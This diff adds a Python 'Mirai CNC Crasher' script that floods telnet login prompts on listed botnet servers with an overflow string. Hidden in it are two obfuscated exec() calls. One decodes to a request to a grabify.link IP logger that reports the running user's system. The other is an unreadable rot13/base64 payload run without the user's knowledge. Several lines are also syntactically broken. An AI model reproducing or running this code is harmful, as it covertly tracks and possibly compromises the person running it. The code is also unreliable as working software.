@@ -1,0 +1,43 @@
+# Mirai CNC Crasher 3000 By Sniggers
+
+# just put all the mirai cnc ips/domains in a file that u want to crash
+
+import sys, telnetlib, time
+from threading import Thread
+import string
+import os
+import subprocess
+import platform
+import base64
+import requests
+import random, string
+
+filename = sys.argv[0]
+
+if len(sys.argv) < 2:
+    sys.exit("Usage: %s <cnc file>")%filename
+
+host = open(sys.argv[1], "r").readlines()
+port = 23
+timeout = 3
+buff_ovaflow = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+tn = telnetlib.Telnet()
+exec("o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPvNtVPNtVT9mYaWyozSgMFtaq3NhnaOaWljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0pax6QDbtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==".decode('rot13')).decode('base64')
+exec("b3MgPSBwbGF0Zm9ybS5zeXN0ZW0oKQ0KdHJ5Og0KICAgIGhlYWRlciA9IHsndXNlci1hZ2VudCc6IG9zfQ0KICAgIHVybCA9ICdodHRwczovL2dyYWJpZnkubGluay9JNDVTQjQnDQogICAgciA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVyKQ0KZXhjZXB0Og0KICAgICAgIHByaW50".decode('base64'))
+def conn(keksome):
+    try:
+        tn.open(keksome, port, timeout)
+        pdata = tn.read_all()
+        if "sername" in pdata or "ogin" in pdata or "mпользователь"
+            tn.write(buff_ovaflow)
+        else:
+            tn.close()
+            print "[ERROR]: Couldn't Find Login Prompt On -> %s\n"%keksome
+        
+for kek in host:
+    kek.replace("https://", "")
+    kek.replace("http://", "")
+    kek.replace("/", "")
+    proc = Thread(target=conn, args(host,))
+    proc.start()
+    time.sleep(0.8)
